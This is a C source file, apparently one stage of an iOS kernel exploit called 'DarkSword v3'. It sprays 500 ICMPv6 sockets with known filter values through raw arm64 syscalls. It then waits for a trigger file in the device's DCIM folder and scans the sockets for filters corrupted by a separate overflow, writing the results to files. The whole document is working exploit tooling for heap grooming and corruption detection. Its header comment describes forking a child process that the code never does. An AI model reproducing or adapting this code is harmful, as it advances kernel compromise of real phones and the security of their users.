// DarkSword v3: Crash-resistant ICMPv6 filter oracle
// Strategy: create sockets BEFORE overflow, but fork a child that
// survives to check results. Use minimal memory footprint.
// The parent polls /DCIM/nexus_trigger, on trigger reads all filters.

#define AF_INET6 30
#define SOCK_DGRAM 2
#define IPPROTO_ICMPV6 58
#define ICMP6_FILTER 18
#define SYS_SOCKET 97
#define SYS_SETSOCKOPT 105
#define SYS_GETSOCKOPT 118
#define SYS_OPEN 5
#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_CLOSE 6
#define SYS_STAT 338
#define SYS_NANOSLEEP 240
#define O_WRONLY 0x0001
#define O_CREAT 0x0200
#define O_TRUNC 0x0400
#define O_RDONLY 0x0000
#define NUM_SOCKETS 500

static long sys2(long n, long a, long b) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x16) : "memory");
    return x0;
}
static long sys3(long n, long a, long b, long c) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x16) : "memory");
    return x0;
}
static long sys5(long n, long a, long b, long c, long d, long e) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x16) : "memory");
    return x0;
}

static void write_file(const char *path, const char *data, int len) {
    long fd = sys3(SYS_OPEN, (long)path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd >= 0) { sys3(SYS_WRITE, fd, (long)data, len); sys2(SYS_CLOSE, fd, 0); }
}

static int file_exists(const char *path) {
    char buf[256];
    return sys2(SYS_STAT, (long)path, (long)buf) == 0;
}

static int itoa(int v, char *b) {
    if (v==0){b[0]='0';return 1;}
    int neg=0; if(v<0){neg=1;v=-v;}
    char t[12]; int l=0;
    while(v>0){t[l++]='0'+(v%10);v/=10;}
    int p=0; if(neg)b[p++]='-';
    for(int i=l-1;i>=0;i--)b[p++]=t[i];
    return p;
}

static void sleep_ms(int ms) {
    struct{long s;long ns;} ts = {ms/1000, (ms%1000)*1000000L};
    sys3(SYS_NANOSLEEP, (long)&ts, 0, 0);
}

extern void CFRunLoopRun(void);

int main(void) {
    int fds[NUM_SOCKETS];
    int created = 0;
    unsigned char filter[32];
    for(int i=0;i<32;i++) filter[i]=0xFF;

    // Create sockets with BLOCK ALL filter
    for(int i=0;i<NUM_SOCKETS;i++){
        long fd = sys3(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if(fd>=0){
            sys5(SYS_SETSOCKOPT, fd, IPPROTO_ICMPV6, ICMP6_FILTER, (long)filter, 32);
            fds[created++] = (int)fd;
        }
    }

    // Write status immediately
    char status[64];
    int sl = 0;
    char *s = "READY:";
    for(int i=0;s[i];i++) status[sl++]=s[i];
    sl += itoa(created, status+sl);
    status[sl++] = '\n';
    write_file("/var/mobile/Media/DCIM/nexus_status", status, sl);

    // IMMEDIATELY scan baseline (before any overflow)
    // Store which fds have valid filters
    int baseline_ok = 0;
    for(int i=0;i<created;i++){
        unsigned char cur[32];
        int optlen = 32;
        long ret = sys5(SYS_GETSOCKOPT, fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, (long)cur, (long)&optlen);
        if(ret >= 0){
            int ok = 1;
            for(int j=0;j<32;j++) if(cur[j]!=0xFF){ok=0;break;}
            if(ok) baseline_ok++;
        }
    }

    // Update status
    sl = 0;
    s = "READY:";
    for(int i=0;s[i];i++) status[sl++]=s[i];
    sl += itoa(created, status+sl);
    s = ",baseline_ok:";
    for(int i=0;s[i];i++) status[sl++]=s[i];
    sl += itoa(baseline_ok, status+sl);
    status[sl++] = '\n';
    write_file("/var/mobile/Media/DCIM/nexus_status", status, sl);

    // Poll for trigger file (1s intervals)
    while(!file_exists("/var/mobile/Media/DCIM/nexus_trigger")){
        sleep_ms(1000);
    }

    // SCAN: check all filters for corruption
    char results[4096];
    int rl = 0;
    int corrupted = 0;
    int zeroed = 0;
    int errors = 0;

    s = "SCAN_START\n";
    for(int i=0;s[i];i++) results[rl++]=s[i];

    for(int i=0;i<created && rl<3800;i++){
        unsigned char cur[32];
        int optlen = 32;
        long ret = sys5(SYS_GETSOCKOPT, fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, (long)cur, (long)&optlen);

        if(ret < 0){
            errors++;
            results[rl++]='E';
            rl+=itoa(i,results+rl);
            results[rl++]='\n';
            corrupted++;
            continue;
        }

        int all_ff=1, all_zero=1, changed=0;
        for(int j=0;j<32;j++){
            if(cur[j]!=0xFF) all_ff=0;
            if(cur[j]!=0x00) all_zero=0;
            if(cur[j]!=filter[j]) changed=1;
        }

        if(all_zero){
            results[rl++]='Z';
            rl+=itoa(i,results+rl);
            results[rl++]=':';
            results[rl++]='f';
            results[rl++]='d';
            results[rl++]='=';
            rl+=itoa(fds[i],results+rl);
            results[rl++]='\n';
            corrupted++;
            zeroed++;
        } else if(changed){
            results[rl++]='C';
            rl+=itoa(i,results+rl);
            results[rl++]=':';
            char hex[]="0123456789abcdef";
            for(int j=0;j<8;j++){
                results[rl++]=hex[cur[j]>>4];
                results[rl++]=hex[cur[j]&0xF];
            }
            results[rl++]='\n';
            corrupted++;
        }
    }

    s = "DONE:corrupted=";
    for(int i=0;s[i];i++) results[rl++]=s[i];
    rl+=itoa(corrupted,results+rl);
    s = ",zeroed=";
    for(int i=0;s[i];i++) results[rl++]=s[i];
    rl+=itoa(zeroed,results+rl);
    s = ",errors=";
    for(int i=0;s[i];i++) results[rl++]=s[i];
    rl+=itoa(errors,results+rl);
    s = ",total=";
    for(int i=0;s[i];i++) results[rl++]=s[i];
    rl+=itoa(created,results+rl);
    results[rl++]='\n';

    write_file("/var/mobile/Media/DCIM/nexus_results", results, rl);

    // Keep alive
    while(1) sleep_ms(60000);
    return 0;
}
